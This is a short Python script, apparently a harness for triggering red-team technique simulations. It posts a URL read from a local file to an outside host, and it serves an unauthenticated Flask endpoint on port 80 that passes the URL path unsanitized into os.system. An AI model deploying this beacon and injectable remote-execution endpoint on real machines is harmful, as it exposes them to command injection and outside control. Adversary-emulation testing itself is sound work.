import os
import requests
from flask import Flask

y=os.system("py -2 D:\\RTA\\ftest.py")
if y==0:
    with open('temp.txt','r') as f:
        content = f.read()
    data = content.split('"')
    for i in data:
        if 'http://' in i:
            print i
            break 

    url="http://deadpool-klsds.run.goorm.io/link"
    c={'link':i}
    requests.post(url=url,data=c)


app=Flask(__name__)

@app.route("/<string:str>")
def certutil(str):
    x=os.system("py D:\\RTA\\red_ttp\\"+str+".py")
    
    if x==0:
        return "{status: successful,name: "+str+"}"
    else:
        return "{status: failed,name: "+str+"}"
    
if __name__ == "__main__":
    app.run(port=80)